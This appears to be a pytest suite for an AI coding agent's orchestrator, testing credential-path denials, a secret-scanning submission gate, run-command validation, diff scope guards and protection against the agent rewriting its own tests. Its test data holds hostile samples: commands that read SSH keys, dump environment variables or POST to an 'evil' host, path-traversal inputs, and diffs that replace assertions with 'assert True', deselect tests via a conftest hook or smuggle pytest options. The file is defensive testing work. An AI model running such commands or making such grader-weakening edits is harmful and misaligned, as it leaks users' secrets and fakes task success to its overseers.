"""Egress gates, write-path denials and untrusted-input validation."""

from __future__ import annotations

import json

import pytest

import config
import executors
import main
import patcher
import redaction
from domains import kaggle_pack

FAKE = "Zz9qW3eR7tYuIoP1aSdF4gH6jKlZxCvB2nM5"


@pytest.fixture(autouse=True)
def _isolated(tmp_path, monkeypatch):
    monkeypatch.setenv("EGRESS_TEST_API_KEY", FAKE)
    monkeypatch.setattr(config, "WORKSPACE_ROOT", tmp_path)
    monkeypatch.setattr(config, "REDACTION_ENABLED", True)
    monkeypatch.setattr(config, "SECRET_SCAN_ENABLED", True)
    monkeypatch.setattr(config, "CONSOLE_ECHO", False)
    redaction.reset_cache()
    yield
    redaction.reset_cache()


def _project(tmp_path, name="proj"):
    root = tmp_path / "projects" / name
    (root / "submissions").mkdir(parents=True)
    (root / "data" / "raw").mkdir(parents=True)
    return root


def _sample(root, header="id,target", rows=("1,0", "2,1")):
    (root / "data" / "raw" / "sample_submission.csv").write_text(
        header + "\n" + "\n".join(rows) + "\n", encoding="utf-8")
    (root / "submissions" / "submission.csv").write_text(
        header + "\n" + "\n".join(rows) + "\n", encoding="utf-8")


# ---------------------------------------------------------------------------
# patcher: credential-bearing paths are not writable
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("rel", [
    ".env", ".env.local", "sub/.env.production",
    "id_rsa", ".ssh/id_ed25519", ".netrc", ".npmrc", ".pypirc",
    "credentials", "aws-credentials.csv", "my-secret.yaml", "creds.yaml",
    "prod_secret.json", "server.pem", "tls.key", "cert.p12", "store.jks",
    "vault.kdbx", ".kaggle/kaggle.json", "service-account.json",
])
def test_resolve_target_denies_secret_paths(tmp_path, rel):
    assert patcher.resolve_target(tmp_path, rel) is None


@pytest.mark.parametrize("rel", [
    "src/main.py", "experiments/exp_baseline.py", "tests/test_x.py",
    "README.md", "requirements.txt", "secrets_manager.py", "src/keyring.py",
    "creds.py", "src/secret_store.py", "docs/secrets.md",
])
def test_resolve_target_allows_ordinary_project_files(tmp_path, rel):
    assert patcher.resolve_target(tmp_path, rel) is not None


def test_path_is_denied_is_case_insensitive(tmp_path):
    assert patcher.path_is_denied("SERVER.PEM")
    assert patcher.path_is_denied("ID_RSA")
    assert not patcher.path_is_denied("src/app.py")


# ---------------------------------------------------------------------------
# Kaggle egress gate
# ---------------------------------------------------------------------------
def test_submission_with_a_secret_is_blocked(tmp_path):
    root = _project(tmp_path)
    _sample(root)
    (root / "submissions" / "submission.csv").write_text(
        f"id,target\n1,{FAKE}\n2,0\n", encoding="utf-8")
    result = executors.run_kaggle_submit(root, "titanic",
                                         "submissions/submission.csv")
    assert result["ok"] is False
    assert "blocked" in result["detail"]
    # The refusal must not echo the secret.
    assert FAKE not in result["detail"]
    assert FAKE not in json.dumps(result)


def test_clean_submission_passes_the_gate(tmp_path):
    root = _project(tmp_path)
    _sample(root)
    assert executors._secret_gate(
        root / "submissions" / "submission.csv", "CV 0.9") == ""
    assert executors.submission_secret_findings(
        root, "submissions/submission.csv") == []


def test_submission_message_is_also_gated(tmp_path):
    root = _project(tmp_path)
    _sample(root)
    target = root / "submissions" / "submission.csv"
    assert executors._secret_gate(target, f"run with {FAKE}") != ""


def test_gate_can_be_disabled(tmp_path, monkeypatch):
    root = _project(tmp_path)
    _sample(root)
    monkeypatch.setattr(config, "SECRET_SCAN_ENABLED", False)
    assert executors._secret_gate(root / "submissions" / "submission.csv") == ""


def test_gate_covers_pattern_shaped_secrets_not_configured_locally(tmp_path):
    root = _project(tmp_path)
    _sample(root)
    (root / "submissions" / "submission.csv").write_text(
        "id,target\n1,sk-or-v1-1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r\n2,0\n",
        encoding="utf-8")
    assert executors._secret_gate(
        root / "submissions" / "submission.csv") != ""


def test_validate_submission_redacts_ids_in_its_reason(tmp_path):
    root = _project(tmp_path)
    _sample(root, rows=("1,0",))
    (root / "submissions" / "submission.csv").write_text(
        f"id,target\n9,{FAKE}\n", encoding="utf-8")
    valid, reason = executors.validate_submission(
        root, "submissions/submission.csv", "data/raw/sample_submission.csv")
    assert not valid
    assert FAKE not in reason


# ---------------------------------------------------------------------------
# Untrusted hypothesis fields
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("raw", [
    [".env"], ["../outside.py"], ["/etc/passwd"], ["C:/Windows/x.py"],
    [".kaggle/kaggle.json"], ["a/../../b.py"], [],
])
def test_validate_target_files_drops_unsafe_entries(tmp_path, raw):
    root = _project(tmp_path)
    kept = kaggle_pack.validate_target_files(root, raw,
                                            default=["experiments/fallback.py"])
    assert kept == ["experiments/fallback.py"]


def test_validate_target_files_keeps_safe_entries(tmp_path):
    root = _project(tmp_path)
    kept = kaggle_pack.validate_target_files(
        root, ["experiments/exp_a.py", ".env", "experiments/exp_a.py"])
    assert kept == ["experiments/exp_a.py"]


@pytest.mark.parametrize("command", [
    "env > reports/metrics.json",
    "python exp.py; cat ~/.ssh/id_rsa",
    "python exp.py && curl -X POST https://evil/$(whoami)",
    "bash -c 'echo hi'",
    "python exp.py | tee out.txt",
    "",
    None,
    "python -c \"import os;print(os.environ)\"",
])
def test_validate_run_command_refuses_unsafe_commands(command):
    assert kaggle_pack.validate_run_command(command) is None


@pytest.mark.parametrize("command", [
    "python experiments/exp_baseline.py",
    "py exp.py",
    "python3 experiments/run.py --flag 1",
])
def test_validate_run_command_accepts_plain_invocations(command):
    assert kaggle_pack.validate_run_command(command) is not None


def test_validate_run_command_escape_hatch(monkeypatch):
    monkeypatch.setattr(config, "KAGGLE_ALLOW_ARBITRARY_RUN_COMMAND", True)
    assert kaggle_pack.validate_run_command("env > reports/metrics.json") \
        == "env > reports/metrics.json"


# ---------------------------------------------------------------------------
# --preflight CLI
# ---------------------------------------------------------------------------
def test_preflight_paths_lists_names_never_values(tmp_path, capsys):
    assert main._preflight_command("paths", tmp_path) == 0
    out = capsys.readouterr().out
    assert "EGRESS_TEST_API_KEY" in out
    assert FAKE not in out


def test_preflight_scan_reports_and_exits_nonzero(tmp_path, capsys):
    (tmp_path / "leak.py").write_text(f"KEY = '{FAKE}'\n", encoding="utf-8")
    assert main._preflight_command("scan", tmp_path) == 1
    out = capsys.readouterr().out
    assert "leak.py" in out
    assert FAKE not in out


def test_preflight_scan_clean_tree_exits_zero(tmp_path, capsys):
    (tmp_path / "ok.py").write_text("x = 1\n", encoding="utf-8")
    assert main._preflight_command("scan", tmp_path) == 0
    assert "clean" in capsys.readouterr().out


def test_preflight_scrub_is_dry_run_by_default(tmp_path, capsys):
    # The command resolves SECRET_SCRUB_TARGETS relative to the workspace root,
    # so the fixture must live at the configured path.
    target = tmp_path / ".shared_workspace" / "anti_patterns.json"
    target.parent.mkdir(parents=True)
    original = json.dumps({"d": "user_ZZZFAKEFAKEFAKEACCT123456789"})
    target.write_text(original, encoding="utf-8")
    rc = main._preflight_command("scrub", tmp_path, apply=False)
    assert rc == 1
    assert "DRY RUN" in capsys.readouterr().out
    # Nothing written, no backup.
    assert target.read_text(encoding="utf-8") == original
    assert list(target.parent.glob("*.bak-*")) == []


def test_preflight_scrub_apply_writes_with_backup(tmp_path, capsys):
    target = tmp_path / ".shared_workspace" / "anti_patterns.json"
    target.parent.mkdir(parents=True)
    target.write_text(json.dumps({"d": "user_ZZZFAKEFAKEFAKEACCT123456789"}),
                      encoding="utf-8")
    assert main._preflight_command("scrub", tmp_path, apply=True) == 1
    assert "user_ZZZFAKEFAKEFAKEACCT123456789" not in target.read_text(encoding="utf-8")
    backups = list(target.parent.glob("anti_patterns.json.bak-*"))
    assert len(backups) == 1
    assert "user_ZZZFAKEFAKEFAKEACCT123456789" in backups[0].read_text(encoding="utf-8")
    # Idempotent: a second apply changes nothing.
    assert main._preflight_command("scrub", tmp_path, apply=True) == 0


def test_preflight_scrub_missing_target_is_not_fatal(tmp_path, capsys):
    assert main._preflight_command("scrub", tmp_path, apply=False) == 0
    assert "not present" in capsys.readouterr().out


# ---------------------------------------------------------------------------
# Pre-apply scope guard: an out-of-scope diff never reaches disk
# ---------------------------------------------------------------------------
# A diff that writes one declared target plus one *path-legal but undeclared*
# file.  ``src/unrelated.py`` passes patcher.resolve_target (so the patcher is
# not what stops it) but is not in task.target_files, so only the scope guard
# can reject it.
_OVERREACHING_DIFF = """--- /dev/null
+++ b/src/approved.py
@@ -0,0 +1,2 @@
+APPROVED = True
--- /dev/null
+++ b/src/unrelated.py
@@ -0,0 +1,2 @@
+INJECTED = True
+SURPRISE = 1
"""

# The same overreach aimed at a credential file.  Here ``patcher.resolve_target``
# refuses outright, so the diff never parses into an applicable section.
_ENV_DIFF = """--- /dev/null
+++ b/src/approved.py
@@ -0,0 +1,2 @@
+APPROVED = True
--- /dev/null
+++ b/.env
@@ -0,0 +1,2 @@
+OPENROUTER_API_KEY=leaked
+OTHER=1
"""


@pytest.mark.parametrize("method", ["_apply_and_test", "_apply_and_objective_gate"])
def test_out_of_scope_diff_is_rejected_before_any_write(tmp_path, method,
                                                         monkeypatch):
    """The pre-apply guard must refuse before ``apply_diff`` touches disk.

    The post-apply guard already covered this via rollback, but the out-of-scope
    file existed on disk in the interim. This asserts the stronger property: it
    is never created at all.
    """
    import asyncio

    import config as cfg
    from project_orchestrator import ProjectOrchestrator
    from validation import MetricSpec, TaskSpec

    monkeypatch.setattr(cfg, "REAL_EXECUTION", True)
    monkeypatch.setattr(cfg, "DEMO_MODE", False)

    project = tmp_path / "projects" / "toy"
    (project / "src").mkdir(parents=True)
    orchestrator = ProjectOrchestrator(tmp_path, "toy")
    task = TaskSpec(
        id="T-1", title="t", objective="o", target_files=["src/approved.py"],
        metric=MetricSpec(name="auc", direction="maximize"),
        run_command="python train.py")

    gate = asyncio.run(getattr(orchestrator, method)(task, _OVERREACHING_DIFF))

    assert gate["ok"] is False
    assert gate["feedback"]
    assert "outside the task scope" in gate["feedback"][0].issue
    # Neither file was written: the refusal happens before apply_diff runs.
    assert not (project / "src" / "approved.py").exists()
    assert not (project / "src" / "unrelated.py").exists()


def test_diff_targeting_a_credential_file_is_refused(tmp_path, monkeypatch):
    """``.env`` is denied by the patcher itself, so the diff never applies."""
    import asyncio

    import config as cfg
    from project_orchestrator import ProjectOrchestrator
    from validation import MetricSpec, TaskSpec

    monkeypatch.setattr(cfg, "REAL_EXECUTION", True)
    monkeypatch.setattr(cfg, "DEMO_MODE", False)

    project = tmp_path / "projects" / "toy"
    (project / "src").mkdir(parents=True)
    orchestrator = ProjectOrchestrator(tmp_path, "toy")
    task = TaskSpec(
        id="T-1", title="t", objective="o",
        target_files=["src/approved.py", ".env"],
        metric=MetricSpec(name="auc", direction="maximize"),
        run_command="python train.py")

    gate = asyncio.run(orchestrator._apply_and_test(task, _ENV_DIFF))
    assert gate["ok"] is False
    assert not (project / ".env").exists()
    assert "leaked" not in (project / "src" / "approved.py").read_text(
        encoding="utf-8") if (project / "src" / "approved.py").exists() else True

# ---------------------------------------------------------------------------
# Test integrity (v2.8): the Builder may not rewrite the tests grading it
# ---------------------------------------------------------------------------
# The threat is *weakening the grader*, not authoring tests.  A board entry
# listing a test file used to make the scope guard permit exactly that.

_WEAKEN_TEST_DIFF = """--- a/tests/test_thing.py
+++ b/tests/test_thing.py
@@ -1,3 +1,3 @@
 def test_real_behaviour():
-    assert compute() == 42
+    assert True
"""

# A pytest_collection_modifyitems hook that deselects every real test and
# substitutes a trivial one -- a green suite that proves nothing.
_DESELECT_HOOK_DIFF = """--- a/tests/conftest.py
+++ b/tests/conftest.py
@@ -0,0 +1,4 @@
+def pytest_collection_modifyitems(session, config, items):
+    items[:] = [i for i in items if "trivial" in i.nodeid] or items
+    config.verbosity = -2
"""

# addopts smuggled through the project file.
_ADDMINUS_DIFF = """--- a/pyproject.toml
+++ b/pyproject.toml
@@ -0,0 +1,3 @@
+[tool.pytest.ini_options]
+addopts = "--ignore=tests/test_thing.py -p no:cacheprovider"
"""


def _seed_grader(project):
    """A project with a pre-existing test tree and pytest config."""
    (project / "tests").mkdir(parents=True)
    (project / "src").mkdir(parents=True)
    (project / "tests" / "conftest.py").write_text(
        "import sys\nsys.path.insert(0, '.')\n", encoding="utf-8")
    (project / "tests" / "test_thing.py").write_text(
        "def test_real_behaviour():\n    assert compute() == 42\n",
        encoding="utf-8")
    (project / "pyproject.toml").write_text(
        "[tool.pytest.ini_options]\ntestpaths = ['tests']\n", encoding="utf-8")


@pytest.mark.parametrize("diff,expected_file", [
    (_WEAKEN_TEST_DIFF, "test_thing.py"),
    (_DESELECT_HOOK_DIFF, "conftest.py"),
    (_ADDMINUS_DIFF, "pyproject.toml"),
])
def test_grader_rewrite_is_refused_even_when_declared(tmp_path, monkeypatch,
                                                      diff, expected_file):
    """A board declaring a test file as a target must not unlock rewriting it.

    This is the exact hole that made the real-pytest gate advisory: the scope
    guard checks membership in ``target_files``, so declaring the test file
    used to make the rewrite legal.
    """
    import asyncio

    import config as cfg
    from project_orchestrator import ProjectOrchestrator
    from validation import TaskSpec

    monkeypatch.setattr(cfg, "REAL_EXECUTION", True)
    monkeypatch.setattr(cfg, "DEMO_MODE", False)

    project = tmp_path / "projects" / "toy"
    project.mkdir(parents=True)
    _seed_grader(project)
    before = (project / "tests" / expected_file).read_text(encoding="utf-8") \
        if (project / "tests" / expected_file).exists() else \
        (project / expected_file).read_text(encoding="utf-8")

    orchestrator = ProjectOrchestrator(tmp_path, "toy")
    task = TaskSpec(
        id="T-1", title="t", objective="o",
        # Deliberately declares the test + config as writable targets.
        target_files=["tests/test_thing.py", "tests/conftest.py",
                      "pyproject.toml"])

    gate = asyncio.run(orchestrator._apply_and_test(task, diff))

    assert gate["ok"] is False
    assert gate["feedback"], "refusal must carry actionable feedback"
    issues = " ".join(f.issue for f in gate["feedback"])
    assert "pre-existing test or pytest config" in issues
    # The grader on disk is byte-identical: nothing was written.
    after = (project / "tests" / expected_file).read_text(encoding="utf-8") \
        if (project / "tests" / expected_file).exists() else \
        (project / expected_file).read_text(encoding="utf-8")
    assert after == before
    assert "assert True" not in after


def test_new_test_files_are_still_writable(tmp_path, monkeypatch):
    """The baseline freeze must not break tests-first: new test files pass."""
    import asyncio

    import config as cfg
    from project_orchestrator import ProjectOrchestrator
    from validation import TaskSpec

    monkeypatch.setattr(cfg, "REAL_EXECUTION", True)
    monkeypatch.setattr(cfg, "DEMO_MODE", False)

    project = tmp_path / "projects" / "toy"
    project.mkdir(parents=True)
    _seed_grader(project)

    new_test = """--- /dev/null
+++ b/tests/test_added.py
@@ -0,0 +1,2 @@
+def test_added():
+    assert True
"""
    orchestrator = ProjectOrchestrator(tmp_path, "toy")
    task = TaskSpec(id="T-1", title="t", objective="o",
                    target_files=["tests/test_added.py"])
    gate = asyncio.run(orchestrator._apply_and_test(task, new_test))
    assert (project / "tests" / "test_added.py").exists()
    assert gate["applied"] == ["tests/test_added.py"]


def test_allow_test_edits_opts_back_in(tmp_path, monkeypatch):
    """``allow_test_edits`` unlocks the rewrite for bootstrap-style tasks."""
    import asyncio

    import config as cfg
    from project_orchestrator import ProjectOrchestrator
    from validation import TaskSpec

    monkeypatch.setattr(cfg, "REAL_EXECUTION", True)
    monkeypatch.setattr(cfg, "DEMO_MODE", False)

    project = tmp_path / "projects" / "toy"
    project.mkdir(parents=True)
    _seed_grader(project)

    orchestrator = ProjectOrchestrator(tmp_path, "toy")
    task = TaskSpec(id="T-1", title="t", objective="o",
                    target_files=["tests/test_thing.py"],
                    allow_test_edits=True)
    gate = asyncio.run(orchestrator._apply_and_test(task, _WEAKEN_TEST_DIFF))
    assert gate["ok"] is True
    assert "assert True" in (project / "tests" / "test_thing.py").read_text(
        encoding="utf-8")


def test_apply_diff_refuses_without_an_orchestrator(tmp_path):
    """``patcher.apply_diff`` is the layer the divergence path goes through.

    The divergence winner re-apply computes ``touched`` for the snapshot but
    historically never ran the scope guard, so an orchestrator-only rule would
    not have fired there. This asserts the patcher-level guard holds on its own.
    """
    from patcher import apply_diff
    from test_integrity import TestIntegrityGuard

    project = tmp_path / "toy"
    _seed_grader(project)
    guard = TestIntegrityGuard.capture(project)

    result = apply_diff(project, _WEAKEN_TEST_DIFF, guard=guard)
    assert not result.ok
    assert any("test-integrity" in f.reason for f in result.failed)
    assert "assert compute() == 42" in (
        project / "tests" / "test_thing.py").read_text(encoding="utf-8")


def test_guard_baseline_is_captured_once_per_task(tmp_path, monkeypatch):
    """A retry is measured against the same specification attempt 1 saw."""
    import config as cfg
    from project_orchestrator import ProjectOrchestrator
    from validation import TaskSpec

    monkeypatch.setattr(cfg, "REAL_EXECUTION", True)
    monkeypatch.setattr(cfg, "DEMO_MODE", False)
    project = tmp_path / "projects" / "toy"
    project.mkdir(parents=True)
    _seed_grader(project)

    orchestrator = ProjectOrchestrator(tmp_path, "toy")
    task = TaskSpec(id="T-1", title="t", objective="o",
                    target_files=["tests/test_thing.py"])
    first = orchestrator._test_guard(task)
    assert orchestrator._test_guard(task) is first
    other = TaskSpec(id="T-2", title="t", objective="o",
                     target_files=["src/x.py"])
    assert orchestrator._test_guard(other) is not first
